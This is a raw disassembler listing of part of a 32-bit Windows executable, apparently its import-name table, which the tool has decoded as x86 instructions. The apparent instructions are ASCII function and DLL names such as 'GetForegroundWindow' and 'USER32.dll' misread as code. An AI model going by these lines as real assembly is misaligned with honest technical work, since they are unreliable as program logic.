  428788:	ins    BYTE PTR es:[edi],dx
  428789:	ins    BYTE PTR es:[edi],dx
  42878a:	push   edi
  42878b:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428792:	add    BYTE PTR [eax],al
  428794:	pop    DWORD PTR [eax]
  428796:	inc    esp
  428797:	gs push di
  42879a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287a1:	outs   dx,DWORD PTR ds:[esi]
  4287a2:	arpl   WORD PTR [edi+0x0],dx
  4287a5:	add    BYTE PTR [ecx],dh
  4287a7:	add    BYTE PTR [ebx+0x68],al
  4287aa:	popa   
  4287ab:	jb     0x4287fd
  4287ad:	jb     0x428814
  4287af:	jbe    0x428808
  4287b1:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  4287b8:	fs popa 
  4287ba:	je     0x428821
  4287bc:	push   edx
  4287bd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4287c2:	xor    eax,DWORD PTR [ecx]
  4287c4:	inc    edi
  4287c5:	gs je  0x428815
  4287c8:	outs   dx,BYTE PTR gs:[esi]
  4287ca:	jne    0x428815
  4287cc:	je     0x428833
  4287ce:	ins    DWORD PTR es:[edi],dx
  4287cf:	dec    ecx
  4287d0:	inc    esp
  4287d1:	add    BYTE PTR ds:0x6e655302,ch
  4287d7:	fs dec esi
  4287d9:	outs   dx,DWORD PTR ds:[esi]
  4287da:	je     0x428845
  4287dc:	data16 jns 0x42882c
  4287df:	gs jae 0x428855
  4287e2:	popa   
  4287e3:	addr16 gs push edi
  4287e6:	add    BYTE PTR [eax],al
  4287e8:	mov    al,0x1
  4287ea:	dec    esp
  4287eb:	outs   dx,DWORD PTR ds:[esi]
  4287ec:	popa   
  4287ed:	fs dec ecx
  4287ef:	arpl   WORD PTR [edi+0x6e],bp
  4287f2:	push   edi
  4287f3:	add    BYTE PTR [ecx+0x57734901],ah
  4287f9:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  428800:	popa   
  428801:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  428805:	add    BYTE PTR ds:0x74654701,dl
  42880b:	inc    esi
  42880c:	outs   dx,DWORD PTR ds:[esi]
  42880d:	jb     0x428874
  42880f:	addr16 jb 0x428881
  428812:	jne    0x428882
  428814:	fs push edi
  428816:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42881d:	add    DWORD PTR [edi+0x65],eax
  428820:	je     0x428879
  428822:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428829:	js     0x42889f
  42882b:	inc    ecx
  42882c:	add    BYTE PTR [eax],al
  42882e:	add    DWORD PTR ds:[edi+0x65],eax
  428832:	je     0x428881
  428834:	gs jae 0x4288aa
  428837:	popa   
  428838:	addr16 gs push edi
  42883b:	add    BYTE PTR [ebx],ch
  42883d:	add    dl,BYTE PTR [ebx+0x65]
  428840:	outs   dx,BYTE PTR ds:[esi]
  428841:	fs dec ebp
  428843:	gs jae 0x4288b9
  428846:	popa   
  428847:	addr16 gs push edi
  42884a:	add    BYTE PTR [eax],al
  42884c:	das    
  42884d:	add    dl,BYTE PTR [ebx+0x65]
  428850:	je     0x428893
  428852:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428856:	gs push edi
  428858:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  42885f:	add    dl,BYTE PTR [edx+0x65]
  428862:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42886a:	popa   
  42886b:	jae    0x4288e0
  42886d:	inc    ebp
  42886e:	js     0x4288c7
  428870:	add    BYTE PTR [eax],al
  428872:	and    DWORD PTR [edx],eax
  428874:	push   ebx
  428875:	outs   dx,BYTE PTR gs:[esi]
  428877:	fs inc esp
  428879:	ins    BYTE PTR es:[edi],dx
  42887a:	addr16 dec ecx
  42887c:	je     0x4288e3
  42887e:	ins    DWORD PTR es:[edi],dx
  42887f:	dec    ebp
  428880:	gs jae 0x4288f6
  428883:	popa   
  428884:	addr16 gs inc ecx
  428887:	add    BYTE PTR ds:0x74654701,bh
  42888d:	dec    ebp
  42888e:	gs jae 0x428904
  428891:	popa   
  428892:	addr16 gs push esp
  428895:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  42889c:	inc    ebx
  42889d:	popa   
  42889e:	jae    0x428903
  4288a0:	popa   
  4288a1:	fs gs push edi
  4288a4:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4288ab:	add    bh,bl
  4288ad:	add    BYTE PTR [ebp+0x78],al
  4288b0:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4288b8:	jae    0x4288ff
  4288ba:	js     0x4288bc
  4288bc:	repnz add DWORD PTR [eax+0x6f],edx
  4288c0:	jae    0x428936
  4288c2:	dec    ebp
  4288c3:	gs jae 0x428939
  4288c6:	popa   
  4288c7:	addr16 gs push edi
  4288ca:	add    BYTE PTR [eax],al
  4288cc:	add    DWORD PTR fs:[edi+0x65],eax
  4288d0:	je     0x428927
  4288d2:	jo     0x428938
  4288d4:	popa   
  4288d5:	je     0x42893c
  4288d7:	push   edx
  4288d8:	outs   dx,BYTE PTR ds:[si]
  4288da:	add    BYTE PTR [eax],al
  4288dc:	mov    BYTE PTR [edx],al
  4288de:	push   esp
  4288df:	popa   
  4288e0:	bound  esp,QWORD PTR [edx+0x65]
  4288e3:	fs push esp
  4288e5:	gs js  0x42895c
  4288e8:	dec    edi
  4288e9:	jne    0x42895f
  4288eb:	push   edi
  4288ec:	add    BYTE PTR [eax],al
  4288ee:	test   eax,0x616f4c01
  4288f3:	fs inc edx
  4288f5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  4288fd:	add    BYTE PTR [edx+esi*2+0x61],al
  428901:	ja     0x428956
  428903:	je     0x428966
  428905:	je     0x42896c
  428907:	push   edi
  428908:	add    BYTE PTR [eax],al
  42890a:	ja     0x42890d
  42890c:	inc    edi
  42890d:	gs je  0x428967
  428910:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428917:	js     0x42898d
  428919:	dec    esp
  42891a:	outs   dx,BYTE PTR gs:[esi]
  42891c:	addr16 je 0x428987
  42891f:	push   edi
  428920:	add    BYTE PTR [eax],al
  428922:	cmp    BYTE PTR [eax],al
  428924:	inc    ebx
  428925:	push   0x70557261
  42892a:	jo     0x428991
  42892c:	jb     0x428970
  42892e:	jne    0x428996
  428930:	push   di
  428932:	add    BYTE PTR [eax],al
  428934:	daa    
  428935:	add    DWORD PTR [edi+0x65],eax
  428938:	je     0x428985
  42893a:	gs jns 0x42899f
  42893d:	outs   dx,DWORD PTR ds:[esi]
  42893e:	popa   
  42893f:	jb     0x4289a5
  428941:	push   esp
  428942:	jns    0x4289b4
  428944:	add    BYTE PTR gs:[ebx+0x1],cl
  428948:	inc    edi
  428949:	gs je  0x42899c
  42894c:	jb     0x4289bd
  42894e:	jo     0x4289a7
  428950:	add    BYTE PTR [eax],al
  428952:	dec    ebp
  428953:	add    BYTE PTR [ebx+0x6f],al
  428956:	jo     0x4289d1
  428958:	push   edx
  428959:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42895e:	sub    eax,0x61684300
  428963:	jb     0x4289b3
  428965:	gs js  0x4289dc
  428968:	push   edi
  428969:	add    BYTE PTR [eax+0x43734901],dl
  42896f:	push   0x6f4c7261
  428974:	ja     0x4289db
  428976:	jb     0x4289b9
  428978:	add    BYTE PTR [eax],al
  42897a:	sub    BYTE PTR [ecx],al
  42897c:	inc    edi
  42897d:	gs je  0x4289cc
  428980:	popa   
  428981:	jae    0x4289f7
  428983:	inc    ecx
  428984:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428988:	gs push eax
  42898a:	outs   dx,DWORD PTR ds:[esi]
  42898b:	jo     0x428a02
  42898d:	jo     0x42898f
  42898f:	add    BYTE PTR [ebx+0x616f4c01],bh
  428995:	fs push ebx
  428997:	je     0x428a0b
  428999:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  4289a0:	inc    edi
  4289a1:	gs je  0x4289fb
  4289a4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4289ab:	outs   dx,BYTE PTR ds:[esi]
  4289ac:	addr16 push edi
  4289ae:	add    BYTE PTR [eax],al
  4289b0:	leave  
  4289b1:	add    DWORD PTR [ebp+0x61],ecx
  4289b4:	jo     0x428a0d
  4289b6:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4289bd:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  4289c4:	inc    ebx
  4289c5:	push   0x6f547261
  4289ca:	dec    edi
  4289cb:	gs ins DWORD PTR es:[edi],dx
  4289cd:	push   edi
  4289ce:	add    BYTE PTR [eax],al
  4289d0:	push   ebp
  4289d1:	push   ebx
  4289d2:	inc    ebp
  4289d3:	push   edx
  4289d4:	xor    esi,DWORD PTR [edx]
  4289d6:	cs fs ins BYTE PTR es:[edi],dx
  4289d9:	ins    BYTE PTR es:[edi],dx
  4289da:	add    BYTE PTR [eax],al
  4289dc:	xchg   edx,eax
  4289dd:	add    edx,DWORD PTR [edx+0x74]
  4289e0:	ins    BYTE PTR es:[edi],dx
  4289e1:	dec    ecx
  4289e2:	outs   dx,BYTE PTR ds:[esi]
  4289e3:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4289eb:	jb     0x428a56
  4289ed:	outs   dx,BYTE PTR ds:[esi]
  4289ee:	add    BYTE PTR [bp+0x74],ch
  4289f2:	fs ins BYTE PTR es:[edi],dx
  4289f4:	ins    BYTE PTR es:[edi],dx
  4289f5:	cs fs ins BYTE PTR es:[edi],dx
  4289f8:	ins    BYTE PTR es:[edi],dx
  4289f9:	add    BYTE PTR ds:0x74654702,al
  4289ff:	dec    esp
  428a00:	outs   dx,DWORD PTR ds:[esi]
  428a01:	arpl   WORD PTR [ecx+0x6c],sp
  428a04:	gs dec ecx
  428a06:	outs   dx,BYTE PTR ds:[esi]
  428a07:	outs   dx,WORD PTR ds:[esi]
  428a09:	push   edi
  428a0a:	add    BYTE PTR [eax],al
  428a0c:	inc    ebp
  428a0d:	add    al,BYTE PTR [edi+0x65]
  428a10:	je     0x428a62
  428a12:	jb     0x428a83
  428a14:	arpl   WORD PTR [ecx+0x64],ax
  428a17:	fs jb  0x428a7f
  428a1a:	jae    0x428a8f
  428a1c:	add    BYTE PTR [eax],al
  428a1e:	rol    DWORD PTR [eax],cl
  428a20:	inc    ebx
  428a21:	jb     0x428a88
  428a23:	popa   
  428a24:	je     0x428a8b
  428a26:	inc    esi
  428a27:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a2f:	outs   dx,BYTE PTR ds:[esi]
  428a30:	addr16 push edi
  428a32:	add    BYTE PTR [eax],al
  428a34:	sub    BYTE PTR [ebx+edx*2],al
  428a37:	gs je  0x428a82
  428a3a:	popa   
  428a3b:	outs   dx,BYTE PTR ds:[esi]
  428a3c:	fs ins BYTE PTR es:[edi],dx
  428a3e:	gs inc ebx
  428a40:	outs   dx,DWORD PTR ds:[esi]
  428a41:	jne    0x428ab1
  428a43:	je     0x428a45
  428a45:	add    ah,bl
  428a47:	add    BYTE PTR [ebx+0x72],al
  428a4a:	gs popa 
  428a4c:	je     0x428ab3
  428a4e:	dec    ebp
  428a4f:	popa   
  428a50:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a58:	pop    DWORD PTR [ecx]
  428a5a:	inc    edi
  428a5b:	gs je  0x428a9f
  428a5e:	je     0x428acf
  428a60:	ins    DWORD PTR es:[edi],dx
  428a61:	dec    esi
  428a62:	popa   
  428a63:	ins    DWORD PTR es:[edi],dx
  428a64:	gs inc ecx
  428a66:	add    BYTE PTR [eax],al
  428a68:	pusha  
  428a69:	add    al,BYTE PTR [edi+0x65]
  428a6c:	je     0x428ac1
  428a6e:	jns    0x428ae3
  428a70:	je     0x428ad7
  428a72:	ins    DWORD PTR es:[edi],dx
  428a73:	push   edi
  428a74:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a7b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428a82:	jns    0x428ac5
  428a84:	add    BYTE PTR [eax],al
  428a86:	aas    
  428a87:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428a8b:	fs dec esp
  428a8d:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428a94:	add    BYTE PTR [eax],al
  428a96:	xchg   ecx,eax
  428a97:	add    al,BYTE PTR [edi+0x6c]
  428a9a:	outs   dx,DWORD PTR ds:[esi]
  428a9b:	bound  esp,QWORD PTR [ecx+0x6c]
  428a9e:	inc    ecx
  428a9f:	ins    BYTE PTR es:[edi],dx
  428aa0:	ins    BYTE PTR es:[edi],dx
  428aa1:	outs   dx,DWORD PTR ds:[esi]
  428aa2:	arpl   WORD PTR [eax],ax
  428aa4:	xchg   edx,eax
  428aa5:	add    al,0x56
  428aa7:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428aae:	jne    0x428b15
  428ab0:	jb     0x428b2b
  428ab2:	add    BYTE PTR [eax],al
  428ab4:	test   DWORD PTR [ecx],0x46746547
  428aba:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428ac2:	jb     0x428ac5
  428ac4:	inc    esi
  428ac5:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428acc:	jne    0x428b40
  428ace:	arpl   WORD PTR [ebp+0x57],sp
  428ad1:	add    BYTE PTR [eax],bh
  428ad3:	add    ecx,DWORD PTR [ebp+0x6f]
  428ad6:	jbe    0x428b3d
  428ad8:	inc    esi
  428ad9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428ae1:	popa   
  428ae2:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428ae9:	jo     0x428b5f
  428aeb:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428af2:	inc    edi
  428af3:	gs je  0x428b38
  428af6:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428afd:	jo     0x428b64
  428aff:	inc    ecx
  428b00:	add    BYTE PTR [eax],al
  428b02:	and    DWORD PTR [ebx+edx*2],eax
  428b05:	gs je  0x428b4e
  428b08:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b10:	bound  esi,QWORD PTR [ebp+0x74]
  428b13:	gs jae 0x428b57
  428b16:	add    BYTE PTR [eax],al
  428b18:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b1c:	jbe    0x428b83
  428b1e:	inc    esi
  428b1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b27:	add    BYTE PTR [ebx+0x6f],al
  428b2a:	jo     0x428ba5
  428b2c:	inc    esi
  428b2d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b35:	jne    0x428b9c
  428b37:	jb     0x428bb2
  428b39:	push   eax
  428b3a:	gs jb  0x428ba3
  428b3d:	outs   dx,DWORD PTR ds:[esi]
  428b3e:	jb     0x428bad
  428b40:	popa   
  428b41:	outs   dx,BYTE PTR ds:[esi]
  428b42:	arpl   WORD PTR [ebp+0x43],sp
  428b45:	outs   dx,DWORD PTR ds:[esi]
  428b46:	jne    0x428bb6
  428b48:	je     0x428baf
  428b4a:	jb     0x428b4c
  428b4c:	sub    DWORD PTR [ebx+edx*2],eax
  428b4f:	gs je  0x428b9a
  428b52:	popa   
  428b53:	outs   dx,BYTE PTR ds:[esi]
  428b54:	fs ins BYTE PTR es:[edi],dx
  428b56:	gs dec ecx
  428b58:	outs   dx,BYTE PTR ds:[esi]
  428b59:	outs   dx,WORD PTR ds:[esi]
  428b5b:	jb     0x428bca
  428b5d:	popa   
  428b5e:	je     0x428bc9
  428b60:	outs   dx,DWORD PTR ds:[esi]
  428b61:	outs   dx,BYTE PTR ds:[esi]
  428b62:	add    BYTE PTR [eax],al
  428b64:	push   ss
  428b65:	add    DWORD PTR [ebp+0x6e],eax
  428b68:	je     0x428bcf
  428b6a:	jb     0x428baf
  428b6c:	jb     0x428bd7
  428b6e:	je     0x428bd9
  428b70:	arpl   WORD PTR [ecx+0x6c],sp
  428b73:	push   ebx
  428b74:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b79:	outs   dx,BYTE PTR ds:[esi]
  428b7a:	add    BYTE PTR [eax],al
  428b7c:	jg     0x428b7f
  428b7e:	inc    esi
  428b7f:	outs   dx,DWORD PTR ds:[esi]
  428b80:	ins    BYTE PTR es:[edi],dx
  428b81:	fs push ebx
  428b83:	je     0x428bf7
  428b85:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428b8c:	ins    BYTE PTR es:[edi],dx
  428b8d:	jae    0x428c03
  428b8f:	jb     0x428bfd
  428b91:	outs   dx,BYTE PTR gs:[esi]
  428b93:	inc    ecx
  428b94:	add    BYTE PTR [eax],al
  428b96:	sahf   
  428b97:	add    DWORD PTR [edi+0x65],eax
  428b9a:	je     0x428bdf
  428b9c:	outs   dx,DWORD PTR ds:[esi]
  428b9d:	ins    DWORD PTR es:[edi],dx
  428b9e:	ins    DWORD PTR es:[edi],dx
  428b9f:	push   esp
  428ba0:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428ba7:	add    BYTE PTR [edx+eax*1+0x47],dh
  428bab:	gs je  0x428c02
  428bae:	push   0x64616572
  428bb3:	push   esp
  428bb4:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428bbb:	inc    ebp
  428bbc:	push   edx
  428bbd:	dec    esi
  428bbe:	inc    ebp
  428bbf:	dec    esp
  428bc0:	xor    esi,DWORD PTR [edx]
  428bc2:	cs fs ins BYTE PTR es:[edi],dx
  428bc5:	ins    BYTE PTR es:[edi],dx
  428bc6:	add    BYTE PTR [eax],al
  428bc8:	mov    dh,0x1
  428bca:	push   eax
  428bcb:	outs   dx,DWORD PTR ds:[esi]
  428bcc:	ins    BYTE PTR es:[edi],dx
  428bcd:	jns    0x428c36
  428bcf:	outs   dx,DWORD PTR ds:[esi]
  428bd0:	outs   dx,BYTE PTR ds:[esi]
  428bd1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428bd5:	gs je  0x428c27
  428bd8:	bound  ebp,QWORD PTR [edx+0x65]
  428bdb:	arpl   WORD PTR [edi+edx*2+0x0],si
  428bdf:	add    BYTE PTR [ebx+0x6c654400],dh
  428be5:	gs je  0x428c4d
  428be8:	inc    esp
  428be9:	inc    ebx
  428bea:	add    BYTE PTR [eax],al
  428bec:	rol    DWORD PTR [ecx],1
  428bee:	push   ebx
  428bef:	gs ins BYTE PTR es:[edi],dx
  428bf1:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428bf6:	push   0x65
  428bf8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bfc:	jmp    0x428bff
  428bfe:	push   ebx
  428bff:	gs je  0x428c4f
  428c02:	popa   
  428c03:	jo     0x428c52
  428c05:	outs   dx,DWORD PTR ds:[esi]
  428c06:	fs add BYTE PTR gs:[eax],al
  428c0a:	leave  
  428c0b:	add    DWORD PTR [edx+0x6f],edx
  428c0e:	jne    0x428c7e
  428c10:	fs push edx
  428c12:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c17:	add    BYTE PTR [edx+0x69],al
  428c1a:	je     0x428c5e
  428c1c:	ins    BYTE PTR es:[edi],dx
  428c1d:	je     0x428c1f
  428c1f:	add    BYTE PTR [ebx+0x61655201],bh
  428c25:	ins    BYTE PTR es:[edi],dx
  428c26:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c2d:	je     0x428ca3
  428c2f:	add    BYTE PTR gs:[eax],al
  428c32:	jge    0x428c35
  428c34:	inc    edi
  428c35:	gs je  0x428c8b
  428c38:	jns    0x428cad
  428c3a:	je     0x428ca1
  428c3c:	ins    DWORD PTR es:[edi],dx
  428c3d:	push   eax
  428c3e:	popa   
  428c3f:	ins    BYTE PTR es:[edi],dx
  428c40:	gs je  0x428cb7
  428c43:	gs push ebp
  428c45:	jae    0x428cac
  428c47:	add    BYTE PTR [eax+0x74654701],cl
  428c4d:	push   esp
  428c4e:	gs js  0x428cc5
  428c51:	inc    ebp
  428c52:	js     0x428cc8
  428c54:	outs   dx,BYTE PTR gs:[esi]
  428c56:	je     0x428ca8
  428c58:	outs   dx,DWORD PTR ds:[esi]
  428c59:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c60:	push   ebx
  428c61:	arpl   WORD PTR [ecx+0x6c],sp
  428c64:	gs push esi
  428c66:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c6d:	inc    ebp
  428c6e:	js     0x428ce4
  428c70:	inc    ebp
  428c71:	js     0x428c73
  428c73:	add    bh,cl
  428c75:	add    DWORD PTR [ebx+0x65],edx
  428c78:	ins    BYTE PTR es:[edi],dx
  428c79:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c7e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428c85:	add    DWORD PTR [ebx+0x65],edx
  428c88:	je     0x428cde
  428c8a:	gs js  0x428d01
  428c8d:	inc    ebx
  428c8e:	outs   dx,DWORD PTR ds:[esi]
  428c8f:	ins    BYTE PTR es:[edi],dx
  428c90:	outs   dx,DWORD PTR ds:[esi]
  428c91:	jb     0x428c93
  428c93:	add    BYTE PTR [eax+0x74615001],ch
  428c99:	push   0x65526f54
  428c9e:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428ca6:	inc    ebx
  428ca7:	outs   dx,DWORD PTR ds:[esi]
  428ca8:	ins    DWORD PTR es:[edi],dx
  428ca9:	bound  ebp,QWORD PTR [ecx+0x6e]
  428cac:	gs push edx
  428cae:	outs   dx,BYTE PTR ds:[si]
  428cb0:	add    BYTE PTR [eax],al
  428cb2:	lods   al,BYTE PTR ds:[esi]
  428cb3:	add    BYTE PTR [ebx+0x72],al
  428cb6:	gs popa 
  428cb8:	je     0x428d1f
  428cba:	push   edx
  428cbb:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428cc0:	outs   dx,BYTE PTR ds:[esi]
  428cc1:	dec    ecx
  428cc2:	outs   dx,BYTE PTR ds:[esi]
  428cc3:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428ccb:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428ccf:	gs push esp
  428cd1:	outs   dx,DWORD PTR ds:[esi]
  428cd2:	add    BYTE PTR [eax],al
  428cd4:	mov    ds:0x65724300,al
  428cd9:	popa   
  428cda:	je     0x428d41
  428cdc:	dec    ecx
  428cdd:	inc    ebx
  428cde:	push   edi
  428cdf:	add    BYTE PTR [ebp+0x63655201],bh
  428ce5:	je     0x428d3d
  428ce7:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cef:	add    BYTE PTR [ebx+0x72],al
  428cf2:	gs popa 
  428cf4:	je     0x428d5b
  428cf6:	push   eax
  428cf7:	popa   
  428cf8:	ins    BYTE PTR es:[edi],dx
  428cf9:	gs je  0x428d70
  428cfc:	add    BYTE PTR gs:[edi+0x44],al
  428d00:	dec    ecx
  428d01:	xor    esi,DWORD PTR [edx]
  428d03:	cs fs ins BYTE PTR es:[edi],dx
  428d06:	ins    BYTE PTR es:[edi],dx
	...
  428d0f:	add    BYTE PTR [ebp+0x20],dl
  428d12:	add    al,BYTE PTR [eax]
	...
  428d30:	dec    ebx
  428d31:	lea    eax,[edx]
	...
  428d3f:	add    BYTE PTR [ecx+0x64],ch
  428d42:	js     0x428dad
  428d44:	outs   dx,DWORD PTR fs:[esi]
  428d46:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d4a:	add    BYTE PTR [ebx+0x65],dl
  428d4d:	je     0x428d90
  428d4f:	outs   dx,BYTE PTR ds:[esi]
  428d50:	arpl   WORD PTR [eax+0x6f],bp
  428d53:	jb     0x428da4
  428d55:	jb     0x428dc0
  428d57:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d5f:	add    BYTE PTR [eax],al
  428d61:	add    BYTE PTR [eax],al
  428d63:	add    al,bl
  428d65:	test   DWORD PTR [edx],eax
  428d67:	add    ah,dh
  428d69:	test   DWORD PTR [edx],eax
  428d6b:	add    BYTE PTR [esi],al
  428d6d:	xchg   BYTE PTR [edx],al
  428d6f:	add    BYTE PTR [eax],bl
  428d71:	xchg   BYTE PTR [edx],al
  428d73:	add    BYTE PTR [eax],dh
  428d75:	xchg   BYTE PTR [edx],al
  428d77:	add    BYTE PTR [esi+eax*4+0x2],al
  428d7b:	add    BYTE PTR [esi-0x7a],bl
  428d7e:	add    al,BYTE PTR [eax]
  428d80:	add    BYTE PTR [eax],al
  428d82:	add    BYTE PTR [eax],al
  428d84:	add    BYTE PTR [esi-0x7961fffe],0x2
  428d8b:	add    BYTE PTR [esi+eax*4-0x7945fffe],ch
  428d92:	add    al,BYTE PTR [eax]
  428d94:	into   
  428d95:	xchg   BYTE PTR [edx],al
  428d97:	add    ah,bl
  428d99:	xchg   BYTE PTR [edx],al
  428d9b:	add    dh,ch
  428d9d:	xchg   BYTE PTR [edx],al
  428d9f:	add    BYTE PTR [eax],al
  428da1:	xchg   DWORD PTR [edx],eax
  428da3:	add    BYTE PTR [esi],cl
  428da5:	xchg   DWORD PTR [edx],eax
  428da7:	add    BYTE PTR [eax],ah
  428da9:	xchg   DWORD PTR [edx],eax
  428dab:	add    BYTE PTR [edx],dh
  428dad:	xchg   DWORD PTR [edx],eax
  428daf:	add    BYTE PTR [eax-0x79],al
  428db2:	add    al,BYTE PTR [eax]
  428db4:	dec    esi
  428db5:	xchg   DWORD PTR [edx],eax
  428db7:	add    BYTE PTR [eax-0x79],ah
  428dba:	add    al,BYTE PTR [eax]
  428dbc:	ins    BYTE PTR es:[edi],dx
  428dbd:	xchg   DWORD PTR [edx],eax
  428dbf:	add    BYTE PTR [edx-0x6bfffd79],al
  428dc5:	xchg   DWORD PTR [edx],eax
  428dc7:	add    BYTE PTR [esi-0x4dfffd79],ah
  428dcd:	xchg   DWORD PTR [edx],eax
  428dcf:	add    dl,al
  428dd1:	xchg   DWORD PTR [edx],eax
  428dd3:	add    dl,dl
  428dd5:	xchg   DWORD PTR [edx],eax
  428dd7:	add    al,ch
  428dd9:	xchg   DWORD PTR [edx],eax
  428ddb:	add    ah,dh
  428ddd:	xchg   DWORD PTR [edx],eax
  428ddf:	add    BYTE PTR [esi],al
  428de1:	mov    BYTE PTR [edx],al
  428de3:	add    BYTE PTR [eax+ecx*4],bl
  428de6:	add    al,BYTE PTR [eax]
  428de8:	mov    BYTE PTR cs:[edx],al
  428deb:	add    BYTE PTR [eax+ecx*4],bh
  428dee:	add    al,BYTE PTR [eax]
  428df0:	dec    esp
  428df1:	mov    BYTE PTR [edx],al
  428df3:	add    BYTE PTR [esi-0x78],bl
  428df6:	add    al,BYTE PTR [eax]
  428df8:	jb     0x428d82
  428dfa:	add    al,BYTE PTR [eax]
  428dfc:	mov    BYTE PTR [eax-0x7765fffe],cl
  428e02:	add    al,BYTE PTR [eax]
  428e04:	lods   al,BYTE PTR ds:[esi]
  428e05:	mov    BYTE PTR [edx],al
  428e07:	add    BYTE PTR [eax+ecx*4-0x7733fffe],bh
  428e0e:	add    al,BYTE PTR [eax]
  428e10:	fmul   QWORD PTR [eax-0x7711fffe]
  428e16:	add    al,BYTE PTR [eax]
  428e18:	cld    
  428e19:	mov    BYTE PTR [edx],al
  428e1b:	add    BYTE PTR [edx],cl
  428e1d:	mov    DWORD PTR [edx],eax
  428e1f:	add    BYTE PTR [edx],ah
  428e21:	mov    DWORD PTR [edx],eax
  428e23:	add    BYTE PTR [ecx+ecx*4],dh
  428e26:	add    al,BYTE PTR [eax]
  428e28:	inc    esi
  428e29:	mov    DWORD PTR [edx],eax
  428e2b:	add    BYTE PTR [edx-0x77],dl
  428e2e:	add    al,BYTE PTR [eax]
  428e30:	pop    esi
  428e31:	mov    DWORD PTR [edx],eax
  428e33:	add    BYTE PTR [edx-0x77],ch
  428e36:	add    al,BYTE PTR [eax]
  428e38:	jp     0x428dc3
  428e3a:	add    al,BYTE PTR [eax]
  428e3c:	nop
  428e3d:	mov    DWORD PTR [edx],eax
  428e3f:	add    BYTE PTR [esi-0x4ffffd77],bl
  428e45:	mov    DWORD PTR [edx],eax
  428e47:	add    dl,al
  428e49:	mov    DWORD PTR [edx],eax
  428e4b:	add    BYTE PTR [eax],al
  428e4d:	add    BYTE PTR [eax],al
  428e4f:	add    ah,bl
  428e51:	mov    DWORD PTR [edx],eax
  428e53:	add    BYTE PTR [eax],al
  428e55:	add    BYTE PTR [eax],al
  428e57:	add    dl,bh
  428e59:	mov    DWORD PTR [edx],eax
  428e5b:	add    BYTE PTR [edx+ecx*4],cl
  428e5e:	add    al,BYTE PTR [eax]
  428e60:	push   ds
  428e61:	mov    al,BYTE PTR [edx]
  428e63:	add    BYTE PTR [edx+ecx*4],dh
  428e66:	add    al,BYTE PTR [eax]
  428e68:	inc    esi
  428e69:	mov    al,BYTE PTR [edx]
  428e6b:	add    BYTE PTR [eax-0x76],bl
  428e6e:	add    al,BYTE PTR [eax]
  428e70:	push   0x8600028a
  428e75:	mov    al,BYTE PTR [edx]
  428e77:	add    BYTE PTR [esi-0x5bfffd76],dl
  428e7d:	mov    al,BYTE PTR [edx]
  428e7f:	add    BYTE PTR [edx+ecx*4-0x753dfffe],dh
  428e86:	add    al,BYTE PTR [eax]
  428e88:	ror    BYTE PTR [edx-0x7521fffe],cl
  428e8e:	add    al,BYTE PTR [eax]
  428e90:	lock mov al,BYTE PTR [edx]
  428e93:	add    BYTE PTR [edx],al
  428e95:	mov    eax,DWORD PTR [edx]
